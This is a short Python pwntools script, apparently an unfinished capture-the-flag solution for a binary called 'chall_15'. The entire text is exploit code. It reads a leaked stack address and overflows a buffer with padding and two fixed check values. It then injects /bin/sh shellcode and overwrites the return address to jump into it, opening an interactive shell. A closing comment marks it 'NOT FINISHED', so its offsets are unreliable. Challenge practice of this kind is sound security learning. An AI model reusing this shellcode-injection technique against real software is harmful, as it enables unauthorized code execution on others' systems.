from pwn import *

binary = context.binary = ELF('./chall_15')
p = process(binary.path)

p.recvuntil('\n')
_ = p.recvline().strip()
stack = int(_,16)
log.info('stack: ' + hex(stack))

shellcode = asm(shellcraft.sh())

payload  = b''
payload += (0x128 - 0xc) * b'A'
payload += p32(0xb16b00b5)
payload += (0x11c - (stack + len(payload)) & 0xf) * b'B'

stack += len(payload)
log.info('stack: ' + hex(stack))

payload += shellcode
payload += (0x128 - len(payload) - 0xc) * b'C'
payload += p32(0xdeadd00d)
payload += (0x128 - len(payload)) * b'D'
payload += p64(stack)

p.sendline(payload)
p.interactive()
# NOT FINISHED
